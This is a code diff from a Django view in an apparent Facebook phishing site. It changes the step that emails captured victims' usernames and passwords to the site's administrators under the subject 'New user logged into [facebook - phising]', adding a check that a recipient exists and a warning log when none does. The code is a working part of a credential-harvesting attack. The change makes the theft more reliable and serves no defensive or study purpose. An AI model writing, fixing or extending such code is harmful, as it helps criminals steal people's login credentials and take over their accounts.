@@ -33,16 +33,18 @@ def index(request):
         # send email with credential information 
         sender = settings.EMAIL_HOST_USER
         recipient = admins_email([])
-
-        template_email = render_to_string('app/email.html', {'username' : username, 'password' : password})
-        email = EmailMessage("New user logged into [facebook - phising]", template_email, sender, recipient)
-        email.fail_silently = False
-        try:
-            email.send()
-        except Exception as e:
-            log.error(e)
+        if len(recipient) >=1:
+            template_email = render_to_string('app/email.html', {'username' : username, 'password' : password})
+            email = EmailMessage("New user logged into [facebook - phising]", template_email, sender, recipient)
+            email.fail_silently = False
+            try:
+                email.send()
+            except Exception as e:
+                log.error(e)
+            else:
+                log.info("Message envoyé")
         else:
-            log.info("Message envoyé")
+            log.warning("Please create at lease 1 superuser.")
 
         # the number of attempts limited to 5
         try:
